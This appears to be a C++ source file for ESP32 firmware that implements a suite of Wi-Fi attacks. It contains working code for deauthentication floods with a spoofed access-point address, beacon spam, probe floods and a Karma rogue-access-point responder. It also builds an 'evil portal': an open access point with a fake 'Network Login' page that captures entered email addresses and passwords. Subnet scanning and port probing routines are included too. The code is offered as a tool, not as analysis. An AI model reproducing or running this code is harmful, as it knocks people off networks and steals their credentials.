#include "nema/esp32/esp32_wifi_radio.h"
#include "nema/runtime.h"
#include "nema/log/logger.h"
#include <esp_wifi.h>
#include <esp_netif.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <unistd.h>
#include <cstring>
#include <cstdio>
#include <cerrno>

namespace nema {

// ── Deauth frame template (802.11 Management, Subtype=12 Deauthentication) ──
// Offsets 4..9 = DA (broadcast or target), 10..15 = SA (spoofed BSSID),
// 16..21 = BSSID, 24..25 = reason (7 = class 3 frame from nonassociated STA).
static const uint8_t kDeauthTemplate[26] = {
    0xC0, 0x00,                          // Frame control
    0x00, 0x00,                          // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: broadcast (fill per-target at runtime)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: spoofed BSSID (filled at runtime)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (same as SA)
    0x00, 0x00,                          // Sequence control
    0x07, 0x00,                          // Reason: class 3 frame from nonassociated
};

// ── Probe Request frame header (802.11 Management, Subtype=4) ────────────────
// 24-byte header: DA=broadcast, SA=filled at runtime (randomised), BSSID=broadcast.
// SSID IE and Supported Rates IE are appended in probeLoop().
static const uint8_t kProbeReqHeader[24] = {
    0x40, 0x00,                          // Frame control: probe request
    0x00, 0x00,                          // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: randomised per-burst (offset 10)
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // BSSID: wildcard
    0x00, 0x00,                          // Sequence control
};
static const uint8_t kSupportedRates[10] = {
    0x01, 0x08,
    0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
};

// ── Beacon frame template (minimal, 802.11 Management, Subtype=8) ────────────
// Bytes 10..11 = frame body offset; SSID IE at byte 36.
static const uint8_t kBeaconTemplate[38] = {
    0x80, 0x00,                          // Frame control: beacon
    0xFF, 0xFF,                          // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: broadcast
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, // SA (filled at runtime)
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, // BSSID (same as SA)
    0x00, 0x00,                          // Sequence control
    // Fixed params (8 bytes): timestamp 0, interval 100TU, caps 0x0401 (ESS+Short Slot)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x64, 0x00,
    0x01, 0x04,
    // SSID IE tag+len (filled at runtime), up to 32 bytes of SSID follow
    0x00, 0x00,
};

// ── Monitor mode: promiscuous RX ──────────────────────────────────────────────
// The promiscuous callback runs outside the WASM sandbox; it pushes raw frames
// into the base-class bounded ring via pushFrame(). Full ring → frame dropped.
static Esp32WifiRadio* s_radio = nullptr;

static void promiscRxCb(void* buf, wifi_promiscuous_pkt_type_t /*type*/) {
    if (!s_radio) return;
    auto* pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
    s_radio->pushFrame(pkt->payload, pkt->rx_ctrl.sig_len);
}

// ──────────────────────────────────────────────────────────────────────────────

void Esp32WifiRadio::init(Runtime& rt) {
    rt_ = &rt;
    loopThread_.start({"RadioLoop", 4096, 5, 0}, loopEntry, this);
}

void Esp32WifiRadio::stop() {
    monitorClose();   // disable promiscuous before thread exits
    doDeauth_ = false;
    doBeacon_ = false;
    doProbe_  = false;
    loopThread_.requestStop();
    loopThread_.join();
}

bool Esp32WifiRadio::parseBssid(std::string_view s, uint8_t out[6]) {
    unsigned int b[6] = {};
    if (std::sscanf(s.data(), "%02x:%02x:%02x:%02x:%02x:%02x",
                    &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6) return false;
    for (int i = 0; i < 6; ++i) out[i] = static_cast<uint8_t>(b[i]);
    return true;
}

std::vector<RadioScanResult> Esp32WifiRadio::scan() {
    // esp_wifi_scan_start with block=true (safe from TaskRunner worker thread).
    wifi_scan_config_t cfg{};
    cfg.scan_type     = WIFI_SCAN_TYPE_ACTIVE;
    cfg.scan_time.active.min = 100;
    cfg.scan_time.active.max = 300;

    esp_err_t err = esp_wifi_scan_start(&cfg, /*block=*/true);
    if (err != ESP_OK) return {};

    uint16_t count = 0;
    esp_wifi_scan_get_ap_num(&count);
    if (count == 0) return {};

    std::vector<wifi_ap_record_t> records(count);
    esp_wifi_scan_get_ap_records(&count, records.data());

    std::vector<RadioScanResult> out;
    out.reserve(count);
    for (const auto& r : records) {
        RadioScanResult res{};
        std::snprintf(res.bssid, sizeof(res.bssid),
                      "%02X:%02X:%02X:%02X:%02X:%02X",
                      r.bssid[0], r.bssid[1], r.bssid[2],
                      r.bssid[3], r.bssid[4], r.bssid[5]);
        std::strncpy(res.ssid, reinterpret_cast<const char*>(r.ssid), sizeof(res.ssid) - 1);
        res.channel = r.primary;
        res.rssi    = static_cast<int8_t>(r.rssi);
        const char* auth = "open";
        if (r.authmode >= WIFI_AUTH_WPA3_PSK)       auth = "wpa3";
        else if (r.authmode >= WIFI_AUTH_WPA2_PSK)  auth = "wpa2";
        else if (r.authmode >= WIFI_AUTH_WPA_PSK)   auth = "wpa";
        std::strncpy(res.auth, auth, sizeof(res.auth) - 1);
        out.push_back(res);
    }
    return out;
}

bool Esp32WifiRadio::monitorOpen(uint8_t ch) {
    s_radio = this;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous_rx_cb(promiscRxCb);
    esp_wifi_set_promiscuous(true);
    return true;
}

void Esp32WifiRadio::monitorClose() {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    s_radio = nullptr;
}

bool Esp32WifiRadio::inject(uint8_t ch, const uint8_t* frame, size_t len) {
    if (!frame || len == 0 || len > 2500) return false;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    return esp_wifi_80211_tx(WIFI_IF_STA, frame, static_cast<int>(len), false) == ESP_OK;
}

bool Esp32WifiRadio::deauthStart(std::string_view bssid, uint8_t channel) {
    std::lock_guard<std::mutex> g(mu_);
    if (!parseBssid(bssid, deauthBssid_)) return false;
    deauthChannel_ = channel;
    doBeacon_      = false;
    doProbe_       = false;
    doDeauth_      = true;
    return true;
}

bool Esp32WifiRadio::deauthStop() {
    doDeauth_ = false;
    return true;
}

bool Esp32WifiRadio::beaconSpamStart(const std::vector<std::string>& ssids) {
    std::lock_guard<std::mutex> g(mu_);
    beaconSsids_ = ssids;
    doDeauth_    = false;
    doProbe_     = false;
    doBeacon_    = true;
    return true;
}

bool Esp32WifiRadio::probeFloodStart(std::string_view ssid, uint8_t channel) {
    std::lock_guard<std::mutex> g(mu_);
    probeSsid_    = std::string(ssid);
    probeChannel_ = channel;
    doDeauth_     = false;
    doBeacon_     = false;
    doProbe_      = true;
    return true;
}

bool Esp32WifiRadio::probeFloodStop() {
    doProbe_ = false;
    return true;
}

bool Esp32WifiRadio::beaconSpamStop() {
    doBeacon_ = false;
    return true;
}

void Esp32WifiRadio::loopEntry(void* self) {
    auto* r = static_cast<Esp32WifiRadio*>(self);
    while (!r->loopThread_.shouldStop()) {
        if      (r->doDeauth_) r->deauthLoop();
        else if (r->doBeacon_) r->beaconLoop();
        else if (r->doProbe_)  r->probeLoop();
        else if (r->doKarma_)  r->karmaLoop();
        else    Thread::sleepMs(10);
    }
}

void Esp32WifiRadio::deauthLoop() {
    uint8_t frame[26];
    uint8_t bssid[6];
    uint8_t ch;
    {
        std::lock_guard<std::mutex> g(mu_);
        std::memcpy(bssid, deauthBssid_, 6);
        ch = deauthChannel_;
    }

    std::memcpy(frame, kDeauthTemplate, sizeof(frame));
    std::memcpy(frame + 4,  bssid, 6);  // DA (broadcast already; override for unicast)
    std::memcpy(frame + 10, bssid, 6);  // SA = spoofed BSSID
    std::memcpy(frame + 16, bssid, 6);  // BSSID

    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);

    char buf[64];
    std::snprintf(buf, sizeof(buf),
                  "{\"bssid\":\"%02X:%02X:%02X:%02X:%02X:%02X\",\"channel\":%d}",
                  bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], (int)ch);
    pushEvent("deauth_sent", buf);

    Thread::sleepMs(100);
}

void Esp32WifiRadio::probeLoop() {
    std::string ssid;
    uint8_t ch;
    {
        std::lock_guard<std::mutex> g(mu_);
        ssid = probeSsid_;
        ch   = probeChannel_;
    }

    // Rotate the last SA byte to simulate different source devices.
    static uint8_t probeSeq = 0;
    uint8_t frame[100];
    size_t pos = sizeof(kProbeReqHeader);
    std::memcpy(frame, kProbeReqHeader, sizeof(kProbeReqHeader));
    frame[10] = 0xDE; frame[11] = 0xAD; frame[12] = 0xBE;
    frame[13] = 0xEF; frame[14] = 0xCA; frame[15] = probeSeq++;

    // SSID IE: tag=0x00, len, ssid bytes (len=0 → wildcard)
    size_t ssidLen = ssid.size() > 32 ? 32 : ssid.size();
    frame[pos++] = 0x00;
    frame[pos++] = static_cast<uint8_t>(ssidLen);
    std::memcpy(frame + pos, ssid.c_str(), ssidLen);
    pos += ssidLen;

    // Supported Rates IE
    std::memcpy(frame + pos, kSupportedRates, sizeof(kSupportedRates));
    pos += sizeof(kSupportedRates);

    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, static_cast<int>(pos), false);

    pushEvent("probe_sent", "{}");
    Thread::sleepMs(50);  // 20 Hz
}

void Esp32WifiRadio::beaconLoop() {
    std::vector<std::string> ssids;
    {
        std::lock_guard<std::mutex> g(mu_);
        ssids = beaconSsids_;
    }

    // Fake MAC: rotate through 0xDE:AD:BE:EF:CA:XX
    static uint8_t fakeMac[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0x00};

    for (size_t i = 0; i < ssids.size(); ++i) {
        if (loopThread_.shouldStop() || !doBeacon_) break;
        fakeMac[5] = static_cast<uint8_t>(i & 0xFF);

        const std::string& ssid = ssids[i];
        size_t ssidLen = ssid.size() > 32 ? 32 : ssid.size();

        // Build beacon: template + SSID IE (tag 0x00, len, ssid bytes)
        std::vector<uint8_t> beacon(kBeaconTemplate,
                                    kBeaconTemplate + sizeof(kBeaconTemplate));
        std::memcpy(beacon.data() + 10, fakeMac, 6);
        std::memcpy(beacon.data() + 16, fakeMac, 6);
        beacon[36] = 0x00;                        // SSID IE tag
        beacon[37] = static_cast<uint8_t>(ssidLen);
        for (size_t j = 0; j < ssidLen; ++j)
            beacon.push_back(static_cast<uint8_t>(ssid[j]));

        esp_wifi_80211_tx(WIFI_IF_STA,
                          beacon.data(), static_cast<int>(beacon.size()), false);

        char buf[64];
        std::snprintf(buf, sizeof(buf), "{\"ssid\":\"%s\"}", ssid.c_str());
        pushEvent("beacon_sent", buf);
    }
    Thread::sleepMs(100);
}

// ── setMac ───────────────────────────────────────────────────────────────────

bool Esp32WifiRadio::setMac(std::string_view mac) {
    if (mac.empty()) return true;
    uint8_t bytes[6];
    if (!parseBssid(mac, bytes)) return false;
    return esp_wifi_set_mac(WIFI_IF_STA, bytes) == ESP_OK;
}

// ── Karma attack ──────────────────────────────────────────────────────────────
// Uses the existing monitor ring: karmaStart() enables promiscuous (monitorOpen),
// then the Core-0 loop drains frames and replies to probe requests.

bool Esp32WifiRadio::karmaStart() {
    std::lock_guard<std::mutex> g(mu_);
    doDeauth_ = false; doBeacon_ = false; doProbe_ = false;
    doKarma_  = true;
    monitorOpen(1);
    return true;
}

bool Esp32WifiRadio::karmaStop() {
    doKarma_ = false;
    monitorClose();
    return true;
}

// Probe-response frame header (36 bytes): DA/SA/BSSID filled at runtime.
static const uint8_t kProbeRespFixed[36] = {
    0x50, 0x00,                          // FC: probe response (type=0 subtype=5)
    0x00, 0x00,                          // Duration
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // DA  (filled from probe SA)
    0xDE, 0xAD, 0xBE, 0xEF, 0xC0, 0xDE,  // SA  (fake BSSID — varied at runtime)
    0xDE, 0xAD, 0xBE, 0xEF, 0xC0, 0xDE,  // BSSID
    0x00, 0x00,                          // Seq ctrl
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // timestamp
    0x64, 0x00,                          // beacon interval 100 TU
    0x11, 0x04,                          // capability: ESS + Short Slot
};

static const uint8_t kProbeRespRates[10] = {
    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
};

void Esp32WifiRadio::handleKarmaFrame(const uint8_t* f, int n) {
    if (n < 26) return;
    if (((f[0] >> 2) & 0x3) != 0 || ((f[0] >> 4) & 0xF) != 4) return; // not probe req
    if (f[24] != 0x00) return;  // no SSID tag
    uint8_t ssid_len = f[25];
    if (ssid_len == 0 || ssid_len > 32 || 26 + (int)ssid_len > n) return;

    uint8_t resp[200];
    std::memcpy(resp, kProbeRespFixed, sizeof(kProbeRespFixed));
    std::memcpy(resp + 4, f + 10, 6);   // DA = probe request SA
    resp[15] = f[11] ^ 0xAA;            // vary fake BSSID last byte
    resp[21] = resp[15];
    size_t pos = sizeof(kProbeRespFixed);
    resp[pos++] = 0x00;
    resp[pos++] = ssid_len;
    std::memcpy(resp + pos, f + 26, ssid_len); pos += ssid_len;
    std::memcpy(resp + pos, kProbeRespRates, sizeof(kProbeRespRates));
    pos += sizeof(kProbeRespRates);

    esp_wifi_80211_tx(WIFI_IF_STA, resp, static_cast<int>(pos), false);

    char ssid[33]; std::memcpy(ssid, f + 26, ssid_len); ssid[ssid_len] = '\0';
    char buf[120];
    std::snprintf(buf, sizeof(buf),
        "{\"ssid\":\"%s\",\"sta\":\"%02X:%02X:%02X:%02X:%02X:%02X\"}",
        ssid, f[10], f[11], f[12], f[13], f[14], f[15]);
    pushEvent("karma_hit", buf);
}

void Esp32WifiRadio::karmaLoop() {
    uint8_t frame[2500];
    int n = monitorRead(frame, sizeof(frame), 100);
    if (n > 0) handleKarmaFrame(frame, n);
}

// ── Evil portal ───────────────────────────────────────────────────────────────

bool Esp32WifiRadio::evilPortalStart(std::string_view ssid,
                                      const char* html, size_t htmlLen) {
    if (epRunning_) return false;
    epSsid_ = std::string(ssid);
    epHtml_ = (html && htmlLen > 0)
              ? std::string(html, htmlLen)
              : std::string();
    epRunning_ = true;
    epThread_.start({"EvilPortal", 8192, 5, 0}, epThreadEntry, this);
    return true;
}

bool Esp32WifiRadio::evilPortalStop() {
    epRunning_ = false;
    epThread_.join();
    return true;
}

static const char kPortalPage[] =
    "<!DOCTYPE html><html><head><title>WiFi Portal</title>"
    "<style>body{font-family:sans-serif;max-width:400px;margin:60px auto;text-align:center}"
    "input{width:100%;padding:8px;margin:6px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:4px}"
    "button{background:#0070f3;color:#fff;padding:10px 32px;border:none;border-radius:4px;cursor:pointer;font-size:16px}"
    "h2{color:#333}</style></head><body>"
    "<h2>Network Login</h2><p>Sign in to get internet access</p>"
    "<form method=POST action=/submit>"
    "<input name=email type=email placeholder='Email address' required>"
    "<input name=pass type=password placeholder='Password' required>"
    "<br><button type=submit>Connect</button>"
    "</form></body></html>";

static int epDnsReply(const uint8_t* q, int qlen, uint8_t* r, int rmax) {
    if (qlen < 12 || rmax < qlen + 16) return 0;
    std::memcpy(r, q, qlen);
    r[2] = 0x81; r[3] = 0x80;
    r[6] = 0x00; r[7] = 0x01;
    r[8] = r[9] = r[10] = r[11] = 0;
    int pos = qlen;
    r[pos++] = 0xC0; r[pos++] = 0x0C;
    r[pos++] = 0x00; r[pos++] = 0x01;
    r[pos++] = 0x00; r[pos++] = 0x01;
    r[pos++] = 0x00; r[pos++] = 0x00; r[pos++] = 0x00; r[pos++] = 0x01;
    r[pos++] = 0x00; r[pos++] = 0x04;
    r[pos++] = 192; r[pos++] = 168; r[pos++] = 4; r[pos++] = 1;
    return pos;
}

void Esp32WifiRadio::epThreadEntry(void* self) {
    static_cast<Esp32WifiRadio*>(self)->epRun();
}

void Esp32WifiRadio::epRun() {
    // Switch to APSTA mode and configure soft AP.
    wifi_mode_t prev = WIFI_MODE_STA;
    esp_wifi_get_mode(&prev);
    esp_wifi_set_mode(WIFI_MODE_APSTA);

    wifi_config_t ap_cfg = {};
    std::strncpy(reinterpret_cast<char*>(ap_cfg.ap.ssid),
                 epSsid_.c_str(), sizeof(ap_cfg.ap.ssid) - 1);
    ap_cfg.ap.ssid_len      = static_cast<uint8_t>(
        epSsid_.size() < 32 ? epSsid_.size() : 32);
    ap_cfg.ap.channel       = 6;
    ap_cfg.ap.authmode      = WIFI_AUTH_OPEN;
    ap_cfg.ap.max_connection = 4;
    esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);

    const char* html     = epHtml_.empty() ? kPortalPage : epHtml_.c_str();
    int         html_len = epHtml_.empty()
                           ? static_cast<int>(sizeof(kPortalPage) - 1)
                           : static_cast<int>(epHtml_.size());

    // DNS server socket (UDP/53)
    int dns_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    struct sockaddr_in sa = {};
    sa.sin_family = AF_INET; sa.sin_addr.s_addr = INADDR_ANY;
    sa.sin_port = htons(53);
    bind(dns_sock, reinterpret_cast<struct sockaddr*>(&sa), sizeof(sa));
    int fl = fcntl(dns_sock, F_GETFL, 0);
    fcntl(dns_sock, F_SETFL, fl | O_NONBLOCK);

    // HTTP server socket (TCP/80)
    int http_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    int opt = 1; setsockopt(http_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    sa.sin_port = htons(80);
    bind(http_sock, reinterpret_cast<struct sockaddr*>(&sa), sizeof(sa));
    listen(http_sock, 4);
    fl = fcntl(http_sock, F_GETFL, 0);
    fcntl(http_sock, F_SETFL, fl | O_NONBLOCK);

    uint8_t dns_q[512], dns_r[600];
    char    http_buf[1280];

    while (epRunning_) {
        // Handle DNS
        struct sockaddr_in cli = {};
        socklen_t clen = sizeof(cli);
        int qn = recvfrom(dns_sock, dns_q, sizeof(dns_q), 0,
                          reinterpret_cast<struct sockaddr*>(&cli), &clen);
        if (qn >= 12) {
            int rn = epDnsReply(dns_q, qn, dns_r, sizeof(dns_r));
            if (rn > 0)
                sendto(dns_sock, dns_r, rn, 0,
                       reinterpret_cast<struct sockaddr*>(&cli), clen);
        }

        // Handle HTTP
        int csock = accept(http_sock, nullptr, nullptr);
        if (csock >= 0) {
            int n = recv(csock, http_buf, sizeof(http_buf) - 1, 0);
            if (n > 0) {
                http_buf[n] = '\0';
                bool is_post   = (http_buf[0] == 'P');
                bool is_submit = is_post && std::strstr(http_buf, "/submit");
                if (is_submit) {
                    const char* body = std::strstr(http_buf, "\r\n\r\n");
                    if (body) {
                        body += 4;
                        char evbuf[300];
                        std::snprintf(evbuf, sizeof(evbuf),
                                      "{\"data\":\"%s\"}", body);
                        pushEvent("ep_creds", evbuf);
                    }
                    const char* thanks =
                        "HTTP/1.0 200 OK\r\nContent-Type:text/html\r\n\r\n"
                        "<html><body><h2>Connected!</h2>"
                        "<p>You are now connected.</p></body></html>";
                    send(csock, thanks, std::strlen(thanks), 0);
                } else {
                    char hdr[128];
                    std::snprintf(hdr, sizeof(hdr),
                        "HTTP/1.0 200 OK\r\nContent-Type:text/html\r\n"
                        "Content-Length:%d\r\n\r\n", html_len);
                    send(csock, hdr, std::strlen(hdr), 0);
                    send(csock, html, html_len, 0);
                }
            }
            close(csock);
        }
        Thread::sleepMs(10);
    }

    close(http_sock);
    close(dns_sock);
    esp_wifi_set_mode(prev);
}

// ── staStatus ────────────────────────────────────────────────────────────────

int Esp32WifiRadio::staStatus(char* out, uint32_t max) {
    esp_netif_t* netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    esp_netif_ip_info_t ip = {};
    bool connected = netif
        && esp_netif_get_ip_info(netif, &ip) == ESP_OK
        && ip.ip.addr != 0;
    if (!connected) {
        const char* s = "disconnected\n";
        uint32_t n = static_cast<uint32_t>(std::strlen(s));
        if (n >= max) return 0;
        std::memcpy(out, s, n); out[n] = '\0';
        return static_cast<int>(n);
    }
    char buf[48];
    std::snprintf(buf, sizeof(buf), "connected\t%d.%d.%d.%d\n",
        (int)((ip.ip.addr)       & 0xFF),
        (int)((ip.ip.addr >>  8) & 0xFF),
        (int)((ip.ip.addr >> 16) & 0xFF),
        (int)((ip.ip.addr >> 24) & 0xFF));
    uint32_t n = static_cast<uint32_t>(std::strlen(buf));
    if (n >= max) return 0;
    std::memcpy(out, buf, n); out[n] = '\0';
    return static_cast<int>(n);
}

// ── arpScan ──────────────────────────────────────────────────────────────────
// Scans .1..30 in the current subnet with 120ms TCP connect timeout per host.
// ECONNREFUSED counts as "alive" (host is up, port closed).

int Esp32WifiRadio::arpScan(char* out, uint32_t max) {
    esp_netif_t* netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!netif) return 0;
    esp_netif_ip_info_t ip_info = {};
    if (esp_netif_get_ip_info(netif, &ip_info) != ESP_OK || !ip_info.ip.addr)
        return 0;

    uint32_t my  = ntohl(ip_info.ip.addr);
    uint32_t msk = ntohl(ip_info.netmask.addr);
    uint32_t base = my & msk;

    int written = 0;
    for (int i = 1; i <= 30 && (uint32_t)written < max - 24; i++) {
        uint32_t target = htonl(base | static_cast<uint32_t>(i));
        if (target == ip_info.ip.addr) continue;  // skip self

        int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock < 0) continue;
        int fl = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, fl | O_NONBLOCK);

        struct sockaddr_in addr = {};
        addr.sin_family = AF_INET;
        addr.sin_port   = htons(80);
        addr.sin_addr.s_addr = target;
        connect(sock, reinterpret_cast<struct sockaddr*>(&addr), sizeof(addr));

        fd_set fds; FD_ZERO(&fds); FD_SET(sock, &fds);
        struct timeval tv = {0, 120000};
        bool alive = false;
        if (select(sock + 1, nullptr, &fds, nullptr, &tv) > 0) {
            int err = 0; socklen_t elen = sizeof(err);
            getsockopt(sock, SOL_SOCKET, SO_ERROR, &err, &elen);
            alive = (err == 0 || err == ECONNREFUSED);
        }
        close(sock);

        if (alive) {
            char ip_str[24];
            std::snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d\n",
                (int)((base >> 24) & 0xFF), (int)((base >> 16) & 0xFF),
                (int)((base >>  8) & 0xFF), i);
            int slen = static_cast<int>(std::strlen(ip_str));
            if (written + slen < (int)max) {
                std::memcpy(out + written, ip_str, slen);
                written += slen;
            }
        }
    }
    if (written < (int)max) out[written] = '\0';
    return written;
}

// ── tcpProbe ─────────────────────────────────────────────────────────────────

int Esp32WifiRadio::tcpProbe(std::string_view host, uint16_t port,
                              uint32_t timeoutMs) {
    std::string h(host);
    in_addr_t addr_raw = inet_addr(h.c_str());
    if (addr_raw == INADDR_NONE) return -1;

    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) return -1;
    int fl = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, fl | O_NONBLOCK);

    struct sockaddr_in addr = {};
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(port);
    addr.sin_addr.s_addr = addr_raw;
    connect(sock, reinterpret_cast<struct sockaddr*>(&addr), sizeof(addr));

    fd_set fds; FD_ZERO(&fds); FD_SET(sock, &fds);
    uint32_t sec  = timeoutMs / 1000;
    uint32_t usec = (timeoutMs % 1000) * 1000;
    struct timeval tv = {static_cast<long>(sec), static_cast<long>(usec)};
    int result = -1;
    if (select(sock + 1, nullptr, &fds, nullptr, &tv) > 0) {
        int err = 0; socklen_t elen = sizeof(err);
        getsockopt(sock, SOL_SOCKET, SO_ERROR, &err, &elen);
        if (err == 0) result = 0;
    }
    close(sock);
    return result;
}

} // namespace nema
